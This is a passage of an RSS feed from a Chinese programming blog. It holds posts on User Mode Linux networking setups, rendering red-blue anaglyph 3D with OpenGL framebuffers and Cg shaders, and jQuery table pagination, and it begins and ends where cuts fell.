-1;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br><b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //pthread_join(thread,0);</b><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(count++%100==0)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("%ld threads created\n", count);<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; return 0;<br>}]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201072675024100/</guid>
    </item>
    <item>
      <title>
<![CDATA[UML三种网络连接方式]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720100632923985/</link>
      <description>
<![CDATA[slirp, tuntap, uml_switch<br>1. slirp<br>#首先在主机上安装slirp <br>sudo apt-get install slirp<br>#启动UML时使用参数eth0=slirp<br>sudo linux ubd0=hjzfs eth0=slirp umid=hjz<br>#启动后设置网络参数,slir方式的ip是固定的10.0.2.15<br>hankjin@jnfdaj:~$ sudo ifconfig eth0 10.0.2.15<br>hankjin@jnfdaj:~$ sudo route add default dev eth0<br>hankjin@jnfdaj:~$ ping www.sina.com<br>hankjin@jnfdaj:~$ wget www.sina.com<br>#SLIRP只支持TCP和UDP，不支持ICMP，所以ping失败<br><br>2. tuntap<br>#将用户加入uml-net组<br>sudo adduser username uml-net<br>#查看本地IP 192.168.1.3<br>ifconfig<br>#找出两个空闲IP，例如192.168.1.4和192.168.1.5<br>将其中一个空闲IP作为tap，另一个作为UML的IP<br>linux ubd0=hjzfs eth0=tuntap,,,192.168.1.4 umid=hjz2<br>进行UML后<br>ifconfig eth0 192.168.1.5 up<br>如果出错，使用dmesg 查看log<br><br>3. uml_switch<br>#首先建立tap和switch，并设置tap的ip，不要和eth0的相同，否则会很麻烦<br>sudo uml_switch -tap tap0 -unix /tmp/umlswitch0 &amp;<br>sudo ifconfig tap0 192.168.1.1 netmask 255.255.255.0<br>#走去UML时使用的参数eth0=daemon,,unix,/tmp/umlswitch0<br>sudo linux ubd0=hjzfs eth0=daemon,,unix,/tmp/umlswitch0<br>#启动后设置网络参数<br>sudo ifconfig eth0 192.168.1.2 netmask 255.255.255.0<br>然后可以用NAT使虚拟交换机的局域网上网<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720100632923985/</guid>
    </item>
    <item>
      <title>
<![CDATA[用OpenGL作红蓝3D]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201052010319858/</link>
      <description>
<![CDATA[理论上比较简单<br>1. 生成左眼图片<br>2. 生成右眼图片<br>3. 合成两张图片<br>具体步骤如下：<br>1.将模型右移若干距离<br>2. 绑定FBO1，将图像画到fboLeft上<br>3. 将模型左移若干距离<br>4. 绑定FBO2，将图像画到fboRight上<br>5. 绑定FBO3，将fboLeft和fboRight作为纹理进行渲染<br>6. fboLeft 的纹理位置右移，fboRight 的纹理位置左移，<br>7. 然后取fboLeft颜色的R值，与fboRight的G值与B值<br>8. 将FBO3的作为纹理，绘制到屏幕上。<br>主要代码如下：<br><br>cg代码：lr2final.cg<br>void main_v(<br>&nbsp;&nbsp;&nbsp; in float2 pos : POSITION,<br>&nbsp;&nbsp;&nbsp; out float4 oPos : POSITION,<br>&nbsp;&nbsp;&nbsp; out float4 coord: TEXCOORD){<br>&nbsp;&nbsp;&nbsp; oPos = float4(pos, 0, 1);<br>&nbsp;&nbsp;&nbsp; coord =&nbsp;&nbsp; (oPos+float4(1,1,0,0))/2;<br>}<br>void main_f(<br>&nbsp;&nbsp;&nbsp; in float4 pos: POSITION,<br>&nbsp;&nbsp;&nbsp; in float4 coord: TEXCOORD,<br>&nbsp;&nbsp;&nbsp; out float4 color: COLOR,<br>&nbsp;&nbsp;&nbsp; uniform sampler2D texLeft,<br>&nbsp;&nbsp;&nbsp; uniform sampler2D texRight,<br>&nbsp;&nbsp;&nbsp; uniform float off3d){&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; float4 leftPos = float4(coord.x+off3d, coord.yzw);<br>&nbsp;&nbsp;&nbsp; float4 rightPos = float4(coord.x-off3d, coord.yzw);<br>&nbsp;&nbsp;&nbsp; float4 leftColor = tex2D(texLeft, leftPos.xy);<br>&nbsp;&nbsp;&nbsp; float4 rightColor = tex2D(texRight, rightPos.xy);<br>&nbsp;&nbsp;&nbsp; //color = rightColor;<br>&nbsp;&nbsp;&nbsp; color = float4(leftColor.r, rightColor.g, rightColor.b, 1);<br>}<br>C++代码: run3d.cpp<br>#include &lt;GL/glew.h&gt;<br>#include &lt;GL/glut.h&gt;<br>#include &lt;CG/cg.h&gt;<br>#include &lt;CG/cgGL.h&gt;<br>#include &lt;windows.h&gt;<br><br><br>#define NULL 0<br>GLuint frameBuffer, renderBuffer, fboLeft, fboRight, fboFinal;<br>CGprofile vertexProfile, fragmentProfile;<br>CGprogram vertexProgram, fragmentProgram;<br><br>float zoomRate = 0.8;<br>float angle = 40.0;<br>bool rotate3d = false;<br>int width = 500, height = 500;<br>float off3d = 0.5;<br>float dist3d = 6;<br><br>void display3d(void);<br>void idle3d();<br>void key3d(unsigned char key, int x, int y);<br><br>void drawLeft();<br>void drawRight();<br>void lr2Final();<br>void screen3d();<br><br>void gen3dFBO();<br>void init3d(int argc, char** argv);<br>void initCG();<br>void drawCube(float x, float y, float z);<br>void vertex(float x, float y, float z);<br>void setCgTexParam(char* paramName, GLuint tex,const CGprogram &amp;program) {//pass<br>&nbsp;&nbsp;&nbsp; CGparameter param = cgGetNamedParameter(program, paramName); <br>&nbsp;&nbsp;&nbsp; cgGLSetTextureParameter(param, tex); <br>&nbsp;&nbsp;&nbsp; cgGLEnableTextureParameter(param);<br>}<br>void loadCgProgram(char * cgFile, CGcontext &amp;context, <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp; CGprogram &amp;vProgram, CGprogram &amp;fProgram, CGprofile &amp;vProfile, CGprofile &amp;fProfile){<br>&nbsp;&nbsp;&nbsp; vProgram = cgCreateProgramFromFile(context,<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; CG_SOURCE, cgFile,<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; vProfile, "main_v", 0);<br>&nbsp;&nbsp;&nbsp; fProgram = cgCreateProgramFromFile(context,<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; CG_SOURCE, cgFile,<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; fProfile, "main_f", 0);<br>&nbsp;&nbsp;&nbsp; if(!cgIsProgram(vProgram) || !cgIsProgram(fProgram))<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; oops("Create Cg Program Failed");<br>&nbsp;&nbsp;&nbsp; cgGLLoadProgram(vProgram);<br>&nbsp;&nbsp;&nbsp; cgGLLoadProgram(fProgram);<br>&nbsp;&nbsp;&nbsp; cgGLBindProgram(vProgram);<br>&nbsp;&nbsp;&nbsp; cgGLBindProgram(fProgram);<br>}<br><br>int main(int argc, char** argv){<br>&nbsp;&nbsp;&nbsp; init3d(argc, argv);<br>&nbsp;&nbsp;&nbsp; glutDisplayFunc(display3d);<br>&nbsp;&nbsp;&nbsp; glutIdleFunc(idle3d);<br>&nbsp;&nbsp;&nbsp; glutKeyboardFunc(key3d);<br>&nbsp;&nbsp;&nbsp; glutMainLoop();<br>&nbsp;&nbsp;&nbsp; return 0;<br>}<br>//显示函数 <br>void display3d(){<br>&nbsp;&nbsp;&nbsp; //启用FBO<br>&nbsp;&nbsp;&nbsp; glBindFramebufferEXT (GL_FRAMEBUFFER_EXT, frameBuffer);<br>&nbsp;&nbsp;&nbsp; glBindRenderbufferEXT(GL_RENDERBUFFER_EXT, renderBuffer);<br><br>&nbsp;&nbsp;&nbsp; //画左右眼到Buffer中<br>&nbsp;&nbsp;&nbsp; drawLeft();<br>&nbsp;&nbsp;&nbsp; drawRight();<br>&nbsp;&nbsp;&nbsp; //合并左右眼到Buffer中<br>&nbsp;&nbsp;&nbsp; lr2Final();<br>&nbsp;&nbsp;&nbsp; //停用FBO<br>&nbsp;&nbsp;&nbsp; glBindFramebufferEXT(GL_FRAMEBUFFER_EXT, 0);<br>&nbsp;&nbsp;&nbsp; //将Buffer画到屏幕上<br>&nbsp;&nbsp;&nbsp; screen3d();<br>&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; glutSwapBuffers();<br>}<br>void idle3d(){&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; static float lastTime&nbsp;&nbsp; = 0.0f;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // This will hold the time from the last frame<br>&nbsp;&nbsp;&nbsp; float currentTime = GetTickCount() * 0.001f;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; if(rotate3d &amp;&amp; currentTime-lastTime&gt;0.04 ){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; angle+=5;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; lastTime = currentTime;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; glutPostRedisplay();<br>&nbsp;&nbsp;&nbsp; }<br>}<br>void key3d(unsigned char k, int x, int y)<br>{<br>&nbsp;&nbsp;&nbsp; switch(k){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; case 27:<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; exit(0);<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; case 'r':<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; rotate3d = !rotate3d;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp; }<br>}<br>//初始化<br>void init3d(int argc, char** argv){<br>&nbsp;&nbsp;&nbsp; glutInit(&amp;argc, argv);<br>&nbsp;&nbsp;&nbsp; glutInitWindowSize(width,height);<br>&nbsp;&nbsp;&nbsp; glutInitDisplayMode(GLUT_DOUBLE | GLUT_RGBA | GLUT_DEPTH);<br>&nbsp;&nbsp;&nbsp; glutCreateWindow("3D");<br>&nbsp;&nbsp;&nbsp; initCG();<br>&nbsp;&nbsp;&nbsp; gen3dFBO();<br>}<br>void setPos(float offset){<br>&nbsp;&nbsp;&nbsp; //设置坐标<br>&nbsp;&nbsp;&nbsp; glMatrixMode(GL_PROJECTION); //pass<br>&nbsp;&nbsp;&nbsp; glLoadIdentity();<br>&nbsp;&nbsp;&nbsp; glFrustum(-1,1, -1,1, 3, 9);<br>&nbsp;&nbsp;&nbsp; glMatrixMode(GL_MODELVIEW); <br>&nbsp;&nbsp;&nbsp; glLoadIdentity();&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; glTranslated(-offset, 0, -dist3d);//平移&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; glScalef(zoomRate, zoomRate, zoomRate);<br>&nbsp;&nbsp;&nbsp; glRotatef(angle, 1, 0, 0);&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br>}<br>void drawLeft(){<br>&nbsp;&nbsp;&nbsp; setPos(-off3d);<br>&nbsp;&nbsp;&nbsp; glFramebufferTexture2DEXT(GL_FRAMEBUFFER_EXT, GL_COLOR_ATTACHMENT0_EXT, GL_TEXTURE_2D, fboLeft, 0);<br>&nbsp;&nbsp;&nbsp; glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT );<br>&nbsp;&nbsp;&nbsp; drawCube(1.0,1.0, 1.0);<br>}<br>void drawRight(){<br>&nbsp;&nbsp;&nbsp; setPos(off3d);<br>&nbsp;&nbsp;&nbsp; glFramebufferTexture2DEXT(GL_FRAMEBUFFER_EXT, GL_COLOR_ATTACHMENT0_EXT, GL_TEXTURE_2D, fboRight, 0);<br>&nbsp;&nbsp;&nbsp; glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT );<br>&nbsp;&nbsp;&nbsp; drawCube(1.0,1.0, 1.0);<br>}<br>void lr2Final(){<br>&nbsp;&nbsp;&nbsp; glFramebufferTexture2DEXT(GL_FRAMEBUFFER_EXT, GL_COLOR_ATTACHMENT0_EXT, GL_TEXTURE_2D, fboFinal, 0);<br><br>&nbsp;&nbsp;&nbsp; glLoadIdentity();<br>&nbsp;&nbsp;&nbsp; glMatrixMode(GL_PROJECTION);<br>&nbsp;&nbsp;&nbsp; glLoadIdentity();<br>&nbsp;&nbsp;&nbsp; gluOrtho2D(0, 1, 0, 1);<br>&nbsp;&nbsp;&nbsp; glMatrixMode(GL_MODELVIEW);<br>&nbsp;&nbsp;&nbsp; glLoadIdentity();<br><br>&nbsp;&nbsp;&nbsp; cgGLEnableProfile(vertexProfile);<br>&nbsp;&nbsp;&nbsp; cgGLEnableProfile(fragmentProfile);<br>&nbsp;&nbsp;&nbsp; float off2tex = off3d*zoomRate*2/dist3d;<br>&nbsp;&nbsp;&nbsp; cgGLSetParameter3fv(cgGetNamedParameter(fragmentProgram,"off3d"), &amp;off2tex);//透明色<br>&nbsp;&nbsp;&nbsp; setCgTexParam("texLeft",fboLeft,fragmentProgram);//纹理<br>&nbsp;&nbsp;&nbsp; setCgTexParam("texRight", fboRight, fragmentProgram);<br>&nbsp;&nbsp;&nbsp; glBegin(GL_QUADS);&nbsp;&nbsp; //画四边形<br>&nbsp;&nbsp;&nbsp; glTexCoord2f(-1,-1); <br>&nbsp;&nbsp;&nbsp; glVertex2f(-1,-1);<br>&nbsp;&nbsp;&nbsp; glTexCoord2f(-1, 1); <br>&nbsp;&nbsp;&nbsp; glVertex2f(-1, 1);<br>&nbsp;&nbsp;&nbsp; glTexCoord2f(1, 1); <br>&nbsp;&nbsp;&nbsp; glVertex2f(1, 1);<br>&nbsp;&nbsp;&nbsp; glTexCoord2f(1,-1); <br>&nbsp;&nbsp;&nbsp; glVertex2f(1,-1);<br>&nbsp;&nbsp;&nbsp; glEnd();&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; cgGLDisableProfile(vertexProfile);<br>&nbsp;&nbsp;&nbsp; cgGLDisableProfile(fragmentProfile);<br>}<br>void screen3d(void){&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; glLoadIdentity();<br>&nbsp;&nbsp;&nbsp; glMatrixMode(GL_PROJECTION);<br>&nbsp;&nbsp;&nbsp; glLoadIdentity();<br>&nbsp;&nbsp;&nbsp; gluOrtho2D(0, 1, 0, 1);<br>&nbsp;&nbsp;&nbsp; glMatrixMode(GL_MODELVIEW);<br>&nbsp;&nbsp;&nbsp; glLoadIdentity();<br><br>&nbsp;&nbsp;&nbsp; glBindTexture(GL_TEXTURE_2D,fboFinal);<br>&nbsp;&nbsp;&nbsp; glClear( GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT );<br>&nbsp;&nbsp;&nbsp; glEnable(GL_TEXTURE_2D);&nbsp;&nbsp;&nbsp; //启用二维画图<br>&nbsp;&nbsp;&nbsp; glDisable(GL_DEPTH_TEST);//停用深度测试，因为这里用的二维&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; glBegin(GL_QUADS);&nbsp;&nbsp; //画四边形<br>&nbsp;&nbsp;&nbsp; glTexCoord2f(0,0); <br>&nbsp;&nbsp;&nbsp; glVertex2f(0,0);<br>&nbsp;&nbsp;&nbsp; glTexCoord2f(0, 1); <br>&nbsp;&nbsp;&nbsp; glVertex2f(0, 1);<br>&nbsp;&nbsp;&nbsp; glTexCoord2f(1, 1); <br>&nbsp;&nbsp;&nbsp; glVertex2f(1, 1);<br>&nbsp;&nbsp;&nbsp; glTexCoord2f(1,0); <br>&nbsp;&nbsp;&nbsp; glVertex2f(1,0);<br>&nbsp;&nbsp;&nbsp; glEnd();&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; glEnable(GL_DEPTH_TEST);//启用深度测试<br>&nbsp;&nbsp;&nbsp; glDisable(GL_TEXTURE_2D);&nbsp;&nbsp;&nbsp; //停用二维画图<br>}<br><br>//产生FBO<br>void gen3dFBO(){<br>&nbsp;&nbsp;&nbsp; glGenFramebuffersEXT(1, &amp;frameBuffer);<br>&nbsp;&nbsp;&nbsp; glBindFramebufferEXT(GL_FRAMEBUFFER_EXT,frameBuffer); //now time i know how to blind the buffer to <br>&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; glGenRenderbuffersEXT(1, &amp;renderBuffer); //create reander buffer.<br>&nbsp;&nbsp;&nbsp; glBindRenderbufferEXT(GL_RENDERBUFFER_EXT, renderBuffer);<br>&nbsp;&nbsp;&nbsp; glRenderbufferStorageEXT(GL_RENDERBUFFER_EXT, GL_DEPTH_COMPONENT, width, height);<br>&nbsp;&nbsp;&nbsp; glFramebufferRenderbufferEXT(GL_FRAMEBUFFER_EXT, GL_DEPTH_ATTACHMENT_EXT, GL_RENDERBUFFER_EXT, renderBuffer);<br>&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; //FBO Left<br>&nbsp;&nbsp;&nbsp; glGenTextures(1, &amp;fboLeft);<br>&nbsp;&nbsp;&nbsp; glBindTexture(GL_TEXTURE_2D, fboLeft);<br>&nbsp;&nbsp;&nbsp; glTexEnvi(GL_TEXTURE_ENV, GL_TEXTURE_ENV_MODE, GL_REPLACE);<br>&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);<br>&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);<br>&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_BORDER);<br>&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_BORDER);<br>&nbsp;&nbsp;&nbsp; glTexImage2D(GL_TEXTURE_2D, 0,GL_RGBA16F_ARB, width, height, 0, GL_RGBA, GL_FLOAT, NULL);<br>&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; //FBO Right<br>&nbsp;&nbsp;&nbsp; glGenTextures(1, &amp;fboRight);<br>&nbsp;&nbsp;&nbsp; glBindTexture(GL_TEXTURE_2D, fboRight);<br>&nbsp;&nbsp;&nbsp; glTexEnvi(GL_TEXTURE_ENV, GL_TEXTURE_ENV_MODE, GL_REPLACE);<br>&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);<br>&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);<br>&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_BORDER);<br>&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_BORDER);<br>&nbsp;&nbsp;&nbsp; glTexImage2D(GL_TEXTURE_2D, 0,GL_RGBA16F_ARB, width, height, 0, GL_RGBA, GL_FLOAT, NULL);<br>&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; //最终显示到屏幕时用的纹理<br>&nbsp;&nbsp;&nbsp; glGenTextures(1, &amp;fboFinal);<br>&nbsp;&nbsp;&nbsp; glBindTexture(GL_TEXTURE_2D, fboFinal);<br>&nbsp;&nbsp;&nbsp; glTexEnvi(GL_TEXTURE_ENV, GL_TEXTURE_ENV_MODE, GL_REPLACE);<br>&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);<br>&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);<br>&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_BORDER);<br>&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_BORDER);<br>&nbsp;&nbsp;&nbsp; glTexImage2D(GL_TEXTURE_2D, 0,GL_RGBA16F_ARB, width, height, 0, GL_RGBA, GL_FLOAT, NULL);<br>}<br>void initCG(){<br>&nbsp;&nbsp;&nbsp; glewInit();<br>&nbsp;&nbsp;&nbsp; CGcontext context = cgCreateContext();<br>&nbsp;&nbsp;&nbsp; vertexProfile = CG_PROFILE_ARBVP1;<br>&nbsp;&nbsp;&nbsp; fragmentProfile = CG_PROFILE_ARBFP1;<br>&nbsp;&nbsp;&nbsp; loadCgProgram("lr2final.cg", context, vertexProgram, fragmentProgram, vertexProfile, fragmentProfile);<br>}<br>void drawCube(float x, float y, float z){<br>&nbsp;&nbsp;&nbsp; glBegin(GL_QUADS);<br>&nbsp;&nbsp;&nbsp; /* Back side */<br>&nbsp;&nbsp;&nbsp; glNormal3f(0.0, 0.0, -1.0); //表示前向面的法线<br>&nbsp;&nbsp;&nbsp; vertex(0.0, 0.0, 0.0); <br>&nbsp;&nbsp;&nbsp; glVertex3f(-1,-1,-1);<br><br>&nbsp;&nbsp;&nbsp; vertex(0.0, y, 0.0);<br>&nbsp;&nbsp;&nbsp; glVertex3f(-1,y,-1);<br><br>&nbsp;&nbsp;&nbsp; vertex(x, y, 0.0);<br>&nbsp;&nbsp;&nbsp; glVertex3f(x,y,-1);<br><br>&nbsp;&nbsp;&nbsp; vertex(x, 0.0, 0.0);<br>&nbsp;&nbsp;&nbsp; glVertex3f(x,-1,-1);<br><br>&nbsp;&nbsp;&nbsp; /* Front side */<br>&nbsp;&nbsp;&nbsp; glNormal3f(0.0, 0.0, 1.0);<br>&nbsp;&nbsp;&nbsp; vertex(0.0, 0.0, z);<br>&nbsp;&nbsp;&nbsp; glVertex3f(-1,-1,z);<br><br>&nbsp;&nbsp;&nbsp; vertex(x, 0.0, z);<br>&nbsp;&nbsp;&nbsp; glVertex3f(x,-1,z);<br>&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; vertex(x, y, z);<br>&nbsp;&nbsp;&nbsp; glVertex3f(x,y,z);<br><br>&nbsp;&nbsp;&nbsp; vertex(0.0, y, z);<br>&nbsp;&nbsp;&nbsp; glVertex3f(-1,y,z);<br>&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; /* Top side */<br>&nbsp;&nbsp;&nbsp; glNormal3f(0.0, 1.0, 0.0);<br>&nbsp;&nbsp;&nbsp; vertex(0.0, y, 0.0);<br>&nbsp;&nbsp;&nbsp; glVertex3f(-1,y,-1);<br><br>&nbsp;&nbsp;&nbsp; vertex(0.0, y, z);<br>&nbsp;&nbsp;&nbsp; glVertex3f(-1,y,z);<br>&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; vertex(x, y, z);<br>&nbsp;&nbsp;&nbsp; glVertex3f(x,y,z);<br>&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; vertex(x, y, 0.0);<br>&nbsp;&nbsp;&nbsp; glVertex3f(x,y,-1);<br><br>&nbsp;&nbsp;&nbsp; /* Bottom side */<br>&nbsp;&nbsp;&nbsp; glNormal3f(0.0, -1.0, 0.0);<br><br>&nbsp;&nbsp;&nbsp; vertex(0.0, 0.0, 0.0);<br>&nbsp;&nbsp;&nbsp; glVertex3f(-1,-1,-1);<br>&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; vertex(x, 0.0, 0.0);<br>&nbsp;&nbsp;&nbsp; glVertex3f(x,-1,-1);<br>&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; vertex(x, 0.0, z);<br>&nbsp;&nbsp;&nbsp; glVertex3f(x,-1,z);<br>&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; vertex(0.0, 0.0, z);<br>&nbsp;&nbsp;&nbsp; glVertex3f(-1,-1,z);<br><br>&nbsp;&nbsp;&nbsp; /* Left side */<br>&nbsp;&nbsp;&nbsp; glNormal3f(-1.0, 0.0, 0.0);<br>&nbsp;&nbsp;&nbsp; vertex(0.0, 0.0, 0.0);<br>&nbsp;&nbsp;&nbsp; glVertex3f(-1,-1,-1);<br><br>&nbsp;&nbsp;&nbsp; vertex(0.0, 0.0, z);<br>&nbsp;&nbsp;&nbsp; glVertex3f(-1,-1,z);<br>&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; vertex(0.0, y, z);<br>&nbsp;&nbsp;&nbsp; glVertex3f(-1,y,z);<br>&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; vertex(0.0, y, 0.0);<br>&nbsp;&nbsp;&nbsp; glVertex3f(-1,y,-1);<br><br>&nbsp;&nbsp;&nbsp; /* Right side */<br>&nbsp;&nbsp;&nbsp; glNormal3f(1.0, 0.0, 0.0);<br>&nbsp;&nbsp;&nbsp; vertex(x, 0.0, 0.0);<br>&nbsp;&nbsp;&nbsp; glVertex3f(x,-1,-1);<br>&nbsp;&nbsp;&nbsp; vertex(x, y, 0.0);<br>&nbsp;&nbsp;&nbsp; glVertex3f(x,y,-1);<br>&nbsp;&nbsp;&nbsp; vertex(x, y, z);<br>&nbsp;&nbsp;&nbsp; glVertex3f(x,y,z);<br>&nbsp;&nbsp;&nbsp; vertex(x, 0.0, z);<br>&nbsp;&nbsp;&nbsp; glVertex3f(x,-1,z);<br>&nbsp;&nbsp;&nbsp; glEnd();&nbsp;&nbsp;&nbsp; <br>}<br>void vertex(float x, float y, float z) //pass<br>{<br>&nbsp;&nbsp;&nbsp; glColor3f(x,y,z);<br>&nbsp;&nbsp;&nbsp; glMultiTexCoord3fARB(GL_TEXTURE1_ARB, x, y, z);//这个是给索引纹理类容用的呀，我怎么能忘记喃<br>}]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Graphics</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201052010319858/</guid>
    </item>
    <item>
      <title>
<![CDATA[jquery对table实现分类并分页]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720091016103116132/</link>
      <description>
<![CDATA[jquery，很好，很强大。<br>需求：若干条记录，要求可以分类，并可以针对每个分类进行分页<br><br>方案：<br>1. 将每个tr看做一条记录，对每个tr赋予一个class “所有分类”，这样就可以用$(".所有分类").hide()完成隐藏<br>2. 对每个tr再赋予一个class：该记录真正的分类“X分类”，这样就可以用$(".X分类").show()显示特定的分类<br>3. 在分类改变的时候，根据该分类的记录数，产生分页列表，并绑定分页事件<br>4. 点击分页列表的时候，调用displayPage函数进行分页<br>5. 首先根据页号计算起始和终止记录号，然后遍历记录列表，显示相应页<br><br>注意：<br>不能用$(".page").click绑定分页事件<br><br>TODO：<br>&nbsp;当前显示页的页号仍然可以点击<br><br>源代码table.html<br>&lt;script src="jquery.js"&gt;&lt;/script&gt;<br>&lt;script type="text/javas<wbr>cript"&gt;<br>var pageSize = 3;//每页显示的记录条数<br>$(document).ready(function(){&nbsp;&nbsp; &nbsp;<br>&nbsp;&nbsp; &nbsp;$("#selType").change(function(){<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp; var page=($("."+$("#selType").val()).length-1)/pageSize+1;//根据记录条数，计算页数<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;var pageLabel=''<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for(i=1;i&lt;=page;i++)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;pageLabel+="&lt;a href='#' class='page' on<wbr>click='displayPage("+i+");'&gt;"+i+"&lt;/a&gt;&amp;nbsp;&amp;nbsp;";<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$("#pageLabel").html(pageLabel);//显示分页控制列表<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;displayPage(1);//显示第一页<br>&nbsp;&nbsp; &nbsp;})<br>&nbsp;&nbsp; &nbsp;$("#selType").trigger('change');//页面载入时，触发分页事件<br>})<br>function displayPage(page){<br>&nbsp;&nbsp; &nbsp;var begin=(page-1)*pageSize;//起始记录号<br>&nbsp;&nbsp; &nbsp;var end=page*pageSize;//终止记录号<br>&nbsp;&nbsp; &nbsp;$(".所有车间").hide();<br>&nbsp;&nbsp; &nbsp;$("."+$("#selType").val()).each(function(i){<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if(i&gt;=begin &amp;&amp; i&lt;end)//显示第page页的记录<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;$(this).show();<br>&nbsp;&nbsp; &nbsp;});<br>&nbsp;&nbsp; &nbsp;return false;<br>}<br>&lt;/script&gt;<br>&lt;select 